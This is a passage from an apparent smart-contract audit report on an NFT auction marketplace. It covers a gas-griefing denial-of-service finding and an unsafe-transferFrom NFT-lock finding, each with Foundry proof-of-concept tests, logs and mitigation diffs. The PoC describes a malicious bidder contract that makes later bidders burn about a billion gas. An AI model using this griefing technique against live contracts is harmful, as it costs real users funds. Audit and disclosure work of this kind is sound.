        console.log("Approximate cost of call in wei:", costInWei, "wei");

        // Check whether `failedTransferCredits` have the amount or not...
        uint256 amount = market.failedTransferCredits(address(maliciousBidder));

        console.log();
        console.log("MaliciousBidder's Balance", address(maliciousBidder).balance);

        // Sometimes `failedTransferCredits` might be non-zero (although that wasn't the case when I run these tests), but still, a lot of gas will be consumed anyway
        console.log("Amount in failedTransferCredits for MaliciousBidder contract:", amount);
    }
    ```

* Run the above test using the command:

    ```bash
    forge test --mt test_dosAttackViaMaliciousContract -vv
    ```

* The output we get:

    ```log
    Ran 1 test for test/BidBeastsMarketPlaceTest.t.sol:BidBeastsNFTMarketTest
    [PASS] test_dosAttackViaMaliciousContract() (gas: 1040287009)
    Logs:
    === DoS Attack Cost Analysis ===
    Gas price set to: 392000000 wei (0.392 gwei)
    
    MaliciousBidder placed initial bid
    Gas used in MaliciousBidder call (normal scenario): 87502
    
    BIDDER_1 placed the next bid
    Gas used in BIDDER_1 call (expensive scenario): 1039826460
    
    === ATTACK RESULTS ===
    Gas units consumed by victim (BIDDER_1): 1039826460
    Approximate cost of call in wei: 407611972320000000 wei
    
    MaliciousBidder's Balance 1200000000000000000
    Amount in failedTransferCredits for MaliciousBidder contract: 0
    
    Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 3.64s (3.64s CPU time)
    ```

## Recommended Mitigation

There are two approaches the protocol can take to mitigate this issue, one is comparatively easier to implement, with not much changes; whereas the other one is a more robust solution. Moreover, the way protocol wants their auctions to be run (the UX) will also influence the choice of mitigation:

1. **Implement Gas limits on External Calls (less preferred, and thus easier)**: Introduce a gas limit to prevent high gas consumption during payouts. For example, a gas limit of 30000 works fine, and fails the above test we just implemented in **Proof of Concept** section. But do keep in mind, the attackers can still consume up to the limit.

    ```diff
        function _payout(address recipient, uint256 amount) internal {
            if (amount == 0) return;
    -        (bool success, ) = payable(recipient).call{value: amount}("");
    +        (bool success, ) = payable(recipient).call{value: amount, gas: 30000}("");
            if (!success) {
                failedTransferCredits[recipient] += amount;
            }
        }
    ```

2. **Adopt a complete Pull-based Refund Mechanism**: Instead of immediately attempting to return the bid amount to the previous bidder, the contract should credit the amount to a mapping—similar to how `failedTransferCredits` works—allowing bidders to withdraw their funds themselves. This aligns with best practices (e.g., OpenSea) and prevents EDoS attacks

    ```diff
    +   mapping(address => uint256) public pendingReturns;

    ...

        function _payout(address recipient, uint256 amount) internal {
            if (amount == 0) return;
    +       pendingReturns[recipient] += amount;
    -       (bool success, ) = payable(recipient).call{value: amount}
    -       if(!success) {
    -           failedTransferCredits[recipient] += amount;
    -       }
        }
    
    ...

    +   function withdrawPendingReturns() external {
    +       uint256 amount = pendingReturns[msg.sender];
    +       require(amount > 0, "No funds to withdraw");
    +       pendingReturns[msg.sender] = 0;
    +       (bool success, ) = payable(msg.sender).call{value: amount}("");
    +       require(success, "Withdraw failed");
    +   }
    ```

---

# Non-safe NFT transfer risks permanent loss

# Using `transferFrom` in `_executeSale` and `unlistNFT` risks sending NFTs to non-ERC721-compliant contracts, causing permanent asset loss

## Description

* The contract uses `transferFrom` to transfer NFTs in both the `BidBeastsNFTMarketPlace::_executeSale` and `BidBeastsNFTMarketPlace::unlistNFT` functions (lines 213 and 97 respectively):

    ```solidity
        // In unlistNFT (line 98)
    @>  BBERC721.transferFrom(address(this), msg.sender, tokenId);

        // In _executeSale (line 213)
    @>  BBERC721.transferFrom(address(this), bid.bidder, tokenId);
    ```

* Unlike `safeTransferFrom`, `transferFrom` does not verify if the recipient contract implements `onERC721Received`, as required by the ERC721 standard. If the recipient is a non-compliant contract (e.g., lacking `onERC721Received` or NFT management logic), the transfer succeeds, but the NFT becomes permanently locked, as the contract cannot approve or transfer it out.
* This violates best practices (e.g., OpenZeppelin's recommendation to use `safeTransferFrom`) and risks user asset loss, especially for bidders using smart contract wallets or sellers unlisting to their own non-compliant contracts.

## Risk

**Likelihood**: Medium

* Most bidders use EOAs or ERC721-compliant wallets, but smart contract wallets (e.g., misconfigured Gnosis Safe) are plausible.

**Impact**: High

* Affected users lose their NFTs permanently, with no protocol-wide impact but significant loss for individuals.

## Proof of Concept

* Add this `NonCompliantReceiver` contract in the test file:

    ```solidity
    contract NonCompliantReceiver {
        // Intentionally does not implement onERC721Received
    }
    ```
    
* After that, add this particular `test_NFTLockedInNonCompliantContract` test in the test file: 

    ```solidity
    function test_NFTLockedInNonCompliantContract() public {
        // Mint and list NFT
        _mintNFT();
        _listNFT(); 

        // Deploy non-compliant receiver
        NonCompliantReceiver receiver = new NonCompliantReceiver();
        vm.deal(address(receiver), 10 ether);

        // Bid from non-compliant contract
        vm.prank(address(receiver));
        market.placeBid{value: BID_AMOUNT}(TOKEN_ID);

        // Warp time to end auction
        vm.warp(block.timestamp + 16 minutes);

        // Settle auction to transfer NFT to receiver
        vm.prank(OWNER);
        market.settleAuction(TOKEN_ID);

        // Verify NFT is owned by receiver
        assertEq(
            nft.ownerOf(TOKEN_ID),
            address(receiver),
            "NFT should be owned by non-compliant contract"
        );

        // Now NFT is stuck in receiver contract as it doesn't implement onERC721Received or any function to transfer it out
    }
    ```

* Run the above test using the command:

    ```bash
    forge test --mt test_NFTLockedInNonCompliantContract -vv
    ```

## Recommended Mitigation

* Although the straightforward suggestion would be to replace `transferFrom` with `safeTransferFrom`, but it has some caveats. With this direct replacement, the contract is at risk of either some reentrancy or DoS attacks, or both. This is because the recipient contract's `onERC721Received` function could contain malicious code that exploits the transfer process. Here's a good write-up about `safeTransferFrom` by RareSkills: [Safe Transfers: safeTransferFrom, _safeMint, and the onERC721Received function](https://rareskills.io/post/erc721#viewer-cucj0), definitely worth a read.

* Thus, it's better to implement a pull-based transfer mechanism along with `safeTransferFrom`, where the contract credits the NFT to the recipient (by using mapping), and the recipient can then call a function to claim the NFT. This way, the transfer is initiated by the recipient, reducing the risk of reentrancy or DoS attacks.
    ```diff
    +   mapping(uint256 => address) public nftClaims;

        function unlistNFT(uint256 tokenId) external isListed(tokenId) isSeller(tokenId, msg.sender) {
            ...
    -       BBERC721.transferFrom(address(this), msg.sender, tokenId);
    +       nftClaims[tokenId] = msg.sender;
            ...
        }

        function _executeSale(uint256 tokenId) internal {
            ...
    -       BBERC721.transferFrom(address(this), bid.bidder, tokenId);
    +       nftClaims[tokenId] = bid.bidder;
            ...
        }

    +   function claimNFT(uint256 tokenId) external {
    +       address claimer = nftClaims[tokenId];
    +       require(claimer == msg.sender, "Not authorized to claim this NFT");
    +       require(claimer != address(0), "No NFT to claim");
    +
    +       nftClaims[tokenId] = address(0); // Clear claim before transfer to prevent reentrancy
    +       BBERC721.safeTransferFrom(address(this), claimer, tokenId);
    +   }
    ```
